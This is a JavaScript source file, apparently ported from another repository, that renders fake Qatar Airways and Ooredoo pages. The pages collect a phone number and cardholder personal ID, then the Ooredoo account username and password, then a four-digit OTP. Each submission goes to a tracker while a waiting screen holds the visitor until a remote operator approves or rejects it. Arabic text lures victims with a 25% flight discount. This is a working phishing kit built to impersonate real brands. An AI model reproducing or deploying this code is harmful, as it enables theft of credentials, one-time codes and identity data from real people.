/* Ported from fanarali881-eng/mokalafatqa @ 91a9d07:
 * MobileVerification.tsx, OoredooLogin.tsx and OoredooOtp.tsx.
 * Adapted to the Qatar Airways static shell and its single visitor tracker.
 */
(function () {
  'use strict';

  if (window.__qaOperatorPagesLoaded) return;
  window.__qaOperatorPagesLoaded = true;

  var path = (window.location.pathname || '').toLowerCase();
  var page = path.indexOf('/mobile-verification') === 0 ? 'mobile' :
    path.indexOf('/ooredoo-login') === 0 ? 'login' :
    path.indexOf('/ooredoo-otp') === 0 ? 'otp' : '';
  if (!page) return;
  document.title = page === 'mobile' ? 'توثيق رقم الهاتف' : (page === 'login' ? 'تسجيل دخول Ooredoo' : 'رمز OTP Ooredoo');

  var root = document.getElementById('qa-operator-root');
  if (!root) return;

  var english = false;
  try { english = window.localStorage.getItem('moiLocale') === 'en'; } catch (error) {}
  var state = { waiting: false, mode: '', phone: '', provider: '', timer: null };

  function t(ar, en) { return english ? en : ar; }
  function escapeHtml(value) {
    return String(value == null ? '' : value).replace(/[&<>"']/g, function (character) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[character];
    });
  }
  function digits(value, length) { return String(value || '').replace(/\D/g, '').slice(0, length || 20); }
  function byId(id) { return document.getElementById(id); }
  function setText(id, value) { var element = byId(id); if (element) element.textContent = value || ''; }
  function setHidden(id, hidden) { var element = byId(id); if (element) element.hidden = !!hidden; }

  function header(variant) {
    if (variant === 'mobile') {
      return '<header class="qa-op-header mobile"><div class="qa-op-header-inner">' +
        '<a class="qa-op-brand" href="/" aria-label="وزارة الداخلية - قطر"><span class="qa-op-brand-frame"><img src="/assets/qa-extras-qatar-logo.svg?v=1" alt="Qatar Airways"></span></a>' +
        '<img class="qa-op-qgcc" src="/qgcc-logo.png" alt="QGCC"></div></header>';
    }
    return '<header class="qa-op-header"><div class="qa-op-header-inner">' +
      '<a class="qa-op-brand" href="/" aria-label="الخطوط الجوية القطرية وأوريدو"><span class="qa-op-brand-frame"><img src="/assets/qa-extras-qatar-logo.svg?v=1" alt="Qatar Airways"></span><span class="qa-op-brand-frame ooredoo"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></span></a>' +
      '<span class="qa-op-language">' + t('العربية', 'English') + '</span></div></header>';
  }

  function footer(variant) {
    return '<footer class="qa-op-footer ' + (variant === 'mobile' ? 'mobile' : '') + '"><div class="qa-op-footer-inner"><div class="qa-op-footer-logos">' +
      '<img src="/assets/qa-extras-qatar-logo.svg?v=1" alt="Qatar Airways">' +
      (variant === 'ooredoo' ? '<img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo">' : '') +
      '</div><p>الخطوط الجوية القطرية</p><small>© ' + new Date().getFullYear() + ' جميع الحقوق محفوظة</small></div></footer>';
  }

  function showWaiting(message, detail) {
    state.waiting = true;
    var overlay = byId('qa-op-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id = 'qa-op-overlay';
      overlay.className = 'qa-op-overlay';
      overlay.innerHTML = '<div class="qa-op-waiting"><div id="qa-op-waiting-brand"></div><div class="qa-op-spinner"></div><h2 id="qa-op-waiting-title"></h2><p id="qa-op-waiting-detail"></p></div>';
      document.body.appendChild(overlay);
    }
    var brand = byId('qa-op-waiting-brand');
    if (brand) {
      if (page === 'mobile') {
        brand.className = 'qa-op-waiting-brand';
        brand.innerHTML = state.provider === 'ooredoo' ? '<img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"><span class="qa-op-waiting-phone" dir="ltr">' + escapeHtml(state.phone) + '</span>' : '<strong style="color:#e60000">vodafone</strong><span class="qa-op-waiting-phone" dir="ltr">' + escapeHtml(state.phone) + '</span>';
      } else {
        brand.className = 'qa-op-waiting-brand';
        brand.innerHTML = '<img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo">';
      }
    }
    setText('qa-op-waiting-title', message);
    setText('qa-op-waiting-detail', detail || t('يرجى الانتظار حتى تتم مراجعة الطلب', 'Please wait while the request is reviewed'));
    overlay.hidden = false;
  }

  function hideWaiting() {
    state.waiting = false;
    var overlay = byId('qa-op-overlay');
    if (overlay) overlay.hidden = true;
  }

  function submitToTracker(detail) {
    window.dispatchEvent(new CustomEvent('qa:operator-consent', { detail: detail }));
  }

  function showError(message) {
    var error = byId('qa-op-error');
    if (!error) return;
    error.textContent = message || '';
    error.hidden = !message;
  }

  function handleAdminAction(action) {
    if (!state.waiting || !action) return;
    action = String(action).toLowerCase();
    if (state.mode === 'resend') {
      hideWaiting();
      if (action === 'approve' || action === 'otp') {
        startOtpTimer();
        showError(t('تمت الموافقة على إعادة إرسال الرمز', 'The resend request was approved'));
      } else {
        showError(t('تعذر إعادة إرسال الرمز. يرجى المحاولة مرة أخرى', 'Unable to resend the code. Please try again'));
      }
      state.mode = '';
      return;
    }
    if (action === 'approve' || action === 'otp') {
      if (page === 'mobile' || page === 'login') window.location.href = '/ooredoo-otp';
      else window.location.href = '/final-page';
      return;
    }
    if (action === 'reject') {
      hideWaiting();
      if (page === 'mobile') showError(t('تعذر التحقق من البيانات، يرجى المحاولة مرة أخرى', 'Unable to verify the data. Please try again.'));
      if (page === 'login') {
        var password = byId('qa-op-password');
        if (password) password.value = '';
        showError(t('البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة', 'The entered credentials are incorrect. Please try again.'));
      }
      if (page === 'otp') {
        document.querySelectorAll('.qa-op-otp input').forEach(function (input) { input.value = ''; });
        var first = document.querySelector('.qa-op-otp input');
        if (first) first.focus();
        showError(t('رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى', 'The verification code is incorrect. Please try again.'));
      }
      state.mode = '';
    }
  }

  window.addEventListener('qa:operator-action', function (event) {
    handleAdminAction(event && event.detail && event.detail.action);
  });

  function consent(label) {
    return '<label class="qa-op-consent"><input id="qa-op-consent" type="checkbox"><span>' + label + '</span></label>';
  }

  function renderMobile() {
    root.innerHTML = '<div class="qa-op-page" dir="' + (english ? 'ltr' : 'rtl') + '">' + header('mobile') +
      '<main class="qa-op-main mobile"><div class="qa-op-container"><section class="qa-op-card mobile">' +
      '<h1 class="qa-op-title">' + t('توثيق رقم الهاتف', 'Mobile number verification') + '</h1>' +
      '<p class="qa-op-copy strong">' + t('يرجى إدخال الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.', 'Enter the phone linked to the payment method to verify ownership.') + '</p>' +
      '<p class="qa-op-copy">' + t('لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، لكن يجب إثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.', 'The card may belong to another person, but ownership must be verified using the cardholder phone and personal number.') + '</p>' +
      '<div id="qa-op-error" class="qa-op-error" hidden></div><form id="qa-op-form" class="qa-op-form narrow">' +
      '<label class="qa-op-field"><span class="qa-op-label">' + t('مزود الخدمة', 'Service provider') + ' <span class="qa-op-required">*</span></span><select id="qa-op-provider" class="qa-op-control"><option value="">' + t('اختر مزود الخدمة', 'Select service provider') + '</option><option value="ooredoo">اوريدو ooredoo</option><option value="vodafone">فودافون vodafone</option></select></label>' +
      '<label id="qa-op-phone-field" class="qa-op-field" hidden><span class="qa-op-label">' + t('رقم الهاتف', 'Phone number') + ' <span class="qa-op-required">*</span></span><input id="qa-op-phone" class="qa-op-control" type="tel" inputmode="numeric" maxlength="12" placeholder="Phone" dir="ltr"></label>' +
      '<label id="qa-op-national-field" class="qa-op-field" hidden><span class="qa-op-label">' + t('الرقم الشخصي لمالك البطاقة', 'Cardholder personal ID') + ' <span class="qa-op-required">*</span></span><input id="qa-op-national" class="qa-op-control" type="text" inputmode="numeric" maxlength="20" placeholder="Id" dir="ltr"></label>' +
      consent(t('أوافق على ربط رقم الهاتف مع الخطوط الجوية القطرية لتلقي العروض.', 'I explicitly consent to sending the provider, phone number and personal ID to the request team to verify line ownership.')) +
      '<button class="qa-op-button" type="submit">' + t('استمر', 'Continue') + '</button></form></section></div></main>' + footer('mobile') + '</div>' +
      '<div id="qa-op-promo" class="qa-op-promo" hidden><section class="qa-op-promo-card" role="dialog" aria-modal="true"><button id="qa-op-promo-close" class="qa-op-close" type="button" aria-label="' + t('إغلاق العرض', 'Close promotion') + '">×</button><div class="qa-op-promo-line"></div><div class="qa-op-promo-content"><div class="qa-op-promo-logos"><span class="qa-op-promo-logo"><img src="/assets/qa-extras-qatar-logo.svg?v=1" alt="Qatar Airways"></span><span class="qa-op-promo-divider"></span><span class="qa-op-promo-logo"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></span></div><h2 class="qa-op-promo-title">' + t('وثق رقم الجوال مع الخطوط الجوية القطرية وأحصل على شريحة إلكترونية QR Code بخصم 25% على جميع الرحلات ولمدة عام', 'Please verify your mobile number so it can be registered and an electronic QR Code can be issued.') + '</h2><button id="qa-op-promo-continue" class="qa-op-button" type="button">' + t('متابعة', 'Continue') + '</button></div></section></div>';

    var provider = byId('qa-op-provider');
    provider.addEventListener('change', function () {
      state.provider = provider.value;
      setHidden('qa-op-phone-field', !provider.value);
      setHidden('qa-op-national-field', provider.value !== 'ooredoo');
      byId('qa-op-phone').value = '';
      byId('qa-op-national').value = '';
      showError('');
    });
    byId('qa-op-phone').addEventListener('input', function (event) { event.target.value = digits(event.target.value, 12); });
    byId('qa-op-national').addEventListener('input', function (event) { event.target.value = digits(event.target.value, 20); });
    byId('qa-op-form').addEventListener('submit', function (event) {
      event.preventDefault();
      var selectedProvider = provider.value;
      var phone = digits(byId('qa-op-phone').value, 12);
      var nationalId = digits(byId('qa-op-national').value, 20);
      var accepted = byId('qa-op-consent').checked;
      if (!selectedProvider) return showError(t('يرجى اختيار مزود الخدمة', 'Please select a service provider'));
      if (phone.length < 7) return showError(t('رقم الهاتف يجب أن يكون بين 7 و12 رقمًا', 'The phone number must be between 7 and 12 digits'));
      if (selectedProvider === 'ooredoo' && !nationalId) return showError(t('الرقم الشخصي مطلوب', 'The personal ID is required'));
      if (!accepted) return showError(t('يرجى الموافقة على إرسال البيانات للمتابعة', 'Please consent to sending the data to continue'));
      showError('');
      state.provider = selectedProvider; state.phone = phone; state.mode = 'verify';
      try { sessionStorage.setItem('telecom_provider', selectedProvider); sessionStorage.setItem('telecom_phone', phone); } catch (error) {}
      submitToTracker({ kind: 'mobile-verification', consent: true, page: 'توثيق رقم الهاتف', nextPage: 'رمز OTP Ooredoo', waitingMessage: 'جاري مصادقة البيانات...', data: { provider: selectedProvider, phone: phone, personalId: selectedProvider === 'ooredoo' ? nationalId : '' } });
      showWaiting(t('جاري مصادقة البيانات...', 'Authenticating data...'), (selectedProvider === 'ooredoo' ? 'Ooredoo' : 'Vodafone') + ' · ' + phone);
    });
    function closePromo() { byId('qa-op-promo').hidden = true; }
    byId('qa-op-promo-close').addEventListener('click', closePromo);
    byId('qa-op-promo-continue').addEventListener('click', closePromo);
    byId('qa-op-promo').addEventListener('click', function (event) { if (event.target === byId('qa-op-promo')) closePromo(); });
    window.setTimeout(function () { var promo = byId('qa-op-promo'); if (promo) promo.hidden = false; }, 2000);
  }

  function renderLogin() {
    root.innerHTML = '<div class="qa-op-page" dir="' + (english ? 'ltr' : 'rtl') + '">' + header('ooredoo') + '<main class="qa-op-main"><div class="qa-op-container">' +
      '<section class="qa-op-strip"><span class="qa-op-strip-icon">☎</span><div><small>الخطوط الجوية القطرية</small><strong>' + t('ربط رقم الهاتف مع حسابك', 'Link your phone number to your account') + '</strong></div></section>' +
      '<div id="qa-op-error" class="qa-op-error" hidden></div><section class="qa-op-card"><h1 class="qa-op-title">' + t('تأكيد ملكية رقم الهاتف وربطه بالحساب', 'Confirm phone ownership and link it to the account') + '</h1><p class="qa-op-copy">' + t('لإتمام التفعيل، يُشترط التحقق من رقم الهاتف المسجّل لدى مشغّل الاتصالات Ooredoo Qatar وربطه رسميًا بحسابك.', 'To complete activation, verify the phone number registered with Ooredoo Qatar and link it to your account.') + '</p>' +
      '<form id="qa-op-form" class="qa-op-form"><label class="qa-op-field"><span class="qa-op-label">' + t('اسم المستخدم أو البريد لدى مشغّل الاتصالات', 'Operator username or email') + '</span><input id="qa-op-identifier" class="qa-op-control" type="text" autocomplete="username" minlength="4" maxlength="160" dir="ltr" placeholder="مثال: 33xxxxxx"></label>' +
      '<label class="qa-op-field"><span class="qa-op-label">' + t('كلمة المرور الخاصة بحساب المشغّل', 'Operator account password') + '</span><span class="qa-op-password-wrap"><input id="qa-op-password" class="qa-op-control" type="password" autocomplete="current-password" minlength="4" maxlength="128" dir="ltr" placeholder="••••••••"><button id="qa-op-eye" class="qa-op-eye" type="button" aria-label="' + t('إظهار كلمة المرور', 'Show password') + '">◉</button></span></label>' +
      '<div class="qa-op-note"><span class="qa-op-note-icon">✓</span><span>' + t('تُستخدم هذه البيانات لمرة واحدة فقط للتحقق من ملكية الخط.', 'These details are used once to verify line ownership.') + '</span></div>' +
      consent(t( 'إتمام الطلب للتحقق من ملكية حساب Ooredoo.', 'I explicitly consent to sending the username and password to the request team to verify Ooredoo account ownership.')) +
      '<button class="qa-op-button" type="submit">' + t('تأكيد الرقم وربطه بالحساب', 'Confirm and link the number') + '</button></form></section></div></main>' + footer('ooredoo') + '</div>';
    byId('qa-op-eye').addEventListener('click', function () { var input = byId('qa-op-password'); input.type = input.type === 'password' ? 'text' : 'password'; });
    byId('qa-op-form').addEventListener('submit', function (event) {
      event.preventDefault();
      var identifier = byId('qa-op-identifier').value.trim();
      var password = byId('qa-op-password').value;
      if (identifier.length < 4 || password.length < 4) return showError(t('يرجى تعبئة البيانات المطلوبة بشكل صحيح', 'Please complete the required details correctly'));
      if (!byId('qa-op-consent').checked) return showError(t('يرجى الموافقة على إرسال البيانات للمتابعة', 'Please consent to sending the data to continue'));
      showError(''); state.mode = 'verify';
      try { sessionStorage.setItem('ooredoo_identifier', identifier); } catch (error) {}
      submitToTracker({ kind: 'ooredoo-login', consent: true, page: 'تسجيل دخول Ooredoo', nextPage: 'رمز OTP Ooredoo', waitingMessage: 'جارٍ التحقق من بيانات مشغّل الاتصالات...', data: { identifier: identifier, password: password, service: 'Ooredoo' } });
      showWaiting(t('جارٍ التحقق من بيانات مشغّل الاتصالات...', 'Verifying operator credentials...'), t('يرجى الانتظار', 'Please wait'));
    });
  }

  function otpCode() { return Array.from(document.querySelectorAll('.qa-op-otp input')).map(function (input) { return input.value; }).join(''); }
  function startOtpTimer() {
    if (state.timer) window.clearInterval(state.timer);
    var seconds = 54;
    var target = byId('qa-op-resend');
    function render() {
      if (!target) return;
      if (seconds > 0) target.innerHTML = t('إعادة الإرسال بعد ', 'Resend in ') + seconds + t(' ثانية', ' seconds');
      else target.innerHTML = '<button id="qa-op-resend-button" class="qa-op-link-button" type="button">' + t('إعادة إرسال الرمز', 'Resend code') + '</button>';
      var button = byId('qa-op-resend-button');
      if (button) button.addEventListener('click', requestResend);
    }
    render();
    state.timer = window.setInterval(function () { seconds -= 1; render(); if (seconds <= 0) { window.clearInterval(state.timer); state.timer = null; } }, 1000);
  }
  function requestResend() {
    if (state.waiting) return;
    state.mode = 'resend';
    submitToTracker({ kind: 'ooredoo-resend', consent: true, page: 'رمز OTP Ooredoo', nextPage: 'رمز OTP Ooredoo', waitingMessage: 'جاري إعادة إرسال الرمز...', data: { request: 'resend', service: 'Ooredoo' } });
    showWaiting(t('جاري إعادة إرسال الرمز...', 'Resending code...'), t('بانتظار موافقة فريق إتمام الطلب', 'Waiting for request-team approval'));
  }

  function renderOtp() {
    root.innerHTML = '<div class="qa-op-page" dir="' + (english ? 'ltr' : 'rtl') + '">' + header('ooredoo') + '<main class="qa-op-main"><div class="qa-op-container">' +
      '<section class="qa-op-strip"><span class="qa-op-strip-icon">☎</span><div><small>الخطوط الجوية القطرية</small><strong>' + t('التحقق برمز OTP', 'OTP verification') + '</strong></div></section>' +
      '<div id="qa-op-error" class="qa-op-error" hidden></div><section class="qa-op-card"><h1 class="qa-op-title">' + t('أدخل رمز التحقق', 'Enter the verification code') + '</h1><p class="qa-op-copy">' + t('تم إرسال رمز التحقق إلى رقم هاتفك المسجّل لدى Ooredoo Qatar', 'A verification code was sent to your phone registered with Ooredoo Qatar') + '</p>' +
      '<form id="qa-op-form" class="qa-op-form"><div class="qa-op-otp">' + [0,1,2,3].map(function (index) { return '<input aria-label="' + t('رقم الرمز ', 'Code digit ') + (index + 1) + '" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code"' + (index === 0 ? ' autofocus' : '') + '>'; }).join('') + '</div>' +
      '<p id="qa-op-resend" class="qa-op-resend"></p><div class="qa-op-note"><span class="qa-op-note-icon">✓</span><span>' + t('هذا الرمز صالح لمرة واحدة فقط ويُستخدم للتحقق من ملكية الرقم.', 'This one-time code is used to verify ownership of the number.') + '</span></div>' +
      consent(t('تأكيد الخطوط الجوية القطرية Ooredoo.', 'I explicitly consent to sending the verification code to the request team to verify ownership of the Ooredoo number.')) +
      '<button class="qa-op-button" type="submit">' + t('تأكيد الرمز', 'Confirm code') + '</button></form></section></div></main>' + footer('ooredoo') + '</div>';
    var inputs = Array.from(document.querySelectorAll('.qa-op-otp input'));
    inputs.forEach(function (input, index) {
      input.addEventListener('input', function () { input.value = digits(input.value, 1); if (input.value && index < inputs.length - 1) inputs[index + 1].focus(); });
      input.addEventListener('keydown', function (event) { if (event.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus(); });
      input.addEventListener('paste', function (event) { var pasted = digits(event.clipboardData && event.clipboardData.getData('text'), 4); if (!pasted) return; event.preventDefault(); pasted.split('').forEach(function (digit, digitIndex) { if (inputs[digitIndex]) inputs[digitIndex].value = digit; }); inputs[Math.min(pasted.length, 4) - 1].focus(); });
    });
    byId('qa-op-form').addEventListener('submit', function (event) {
      event.preventDefault();
      var code = otpCode();
      if (code.length !== 4) return showError(t('يرجى إدخال رمز التحقق المكوّن من 4 أرقام', 'Enter the 4-digit verification code'));
      if (!byId('qa-op-consent').checked) return showError(t('يرجى الموافقة على إرسال الرمز للمتابعة', 'Please consent to sending the code to continue'));
      showError(''); state.mode = 'verify';
      submitToTracker({ kind: 'ooredoo-otp', consent: true, page: 'رمز OTP Ooredoo', nextPage: 'الصفحة النهائية', waitingMessage: 'جارٍ التحقق من رمز OTP...', data: { code: code, service: 'Ooredoo' } });
      showWaiting(t('جارٍ التحقق من رمز OTP...', 'Verifying OTP code...'), t('يرجى الانتظار', 'Please wait'));
    });
    startOtpTimer();
  }

  if (page === 'mobile') renderMobile();
  if (page === 'login') renderLogin();
  if (page === 'otp') renderOtp();
})();
